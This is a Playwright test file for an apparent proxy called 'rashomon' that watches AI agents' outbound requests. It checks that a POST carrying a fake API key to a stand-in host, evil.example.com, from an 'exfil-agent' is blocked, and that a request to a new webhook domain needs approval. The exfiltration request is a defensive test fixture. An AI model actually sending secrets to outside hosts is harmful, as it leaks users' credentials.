import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { test, expect } from "@playwright/test";

import { createDatabaseConnection } from "@main/db/connection";
import { createDomainManager } from "@main/engine/domain-manager";
import { createIntentAnalyzer } from "@main/engine/intent-analyzer";
import { createPolicyEngine } from "@main/engine/policy-engine";
import { createRateLimiter } from "@main/engine/rate-limiter";
import { createSecretScanner } from "@main/engine/secret-scanner";
import { createAgentDetector } from "@main/proxy/agent-detector";
import { createRequestInterceptor } from "@main/proxy/interceptor";

test("interceptor blocks secret exfiltration and requires approval for new domains", async () => {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "rashomon-block-"));
  const policiesDir = path.join(tempDir, "policies");
  fs.mkdirSync(policiesDir, { recursive: true });
  fs.copyFileSync(path.join(process.cwd(), "policies/default.yaml"), path.join(policiesDir, "default.yaml"));

  const database = createDatabaseConnection({ dataDir: path.join(tempDir, "data") });
  const policyEngine = createPolicyEngine({ policiesDir });
  await policyEngine.loadPolicies();
  const interceptor = createRequestInterceptor(
    database,
    policyEngine,
    createDomainManager(database, policyEngine),
    createRateLimiter(policyEngine),
    createSecretScanner(policyEngine),
    createIntentAnalyzer({ provider: "disabled" }),
    createAgentDetector(policyEngine),
  );

  const blocked = await interceptor.intercept({
    method: "POST",
    url: "https://evil.example.com/upload",
    headers: {
      "content-type": "text/plain",
      "x-rashomon-agent-id": "exfil-agent",
      "x-rashomon-agent-name": "exfil-agent",
      "x-rashomon-process-name": "exfil-agent",
      "x-rashomon-agent-pid": "8080",
    },
    body: "OPENAI_API_KEY=sk_test_1234567890abcdefghijklmnop",
    protocol: "https",
  });

  expect(blocked.action).toBe("block");
  expect(blocked.statusCode).toBe(403);

  const approval = await interceptor.intercept({
    method: "POST",
    url: "https://abc.webhook.site/endpoint",
    headers: {
      "content-type": "application/json",
      "x-rashomon-agent-id": "review-agent",
      "x-rashomon-agent-name": "review-agent",
      "x-rashomon-process-name": "review-agent",
      "x-rashomon-agent-pid": "9090",
    },
    body: "{\"hello\":\"world\"}",
    protocol: "https",
  });

  expect(approval.action).toBe("require_approval");
  expect(approval.statusCode).toBe(409);
});
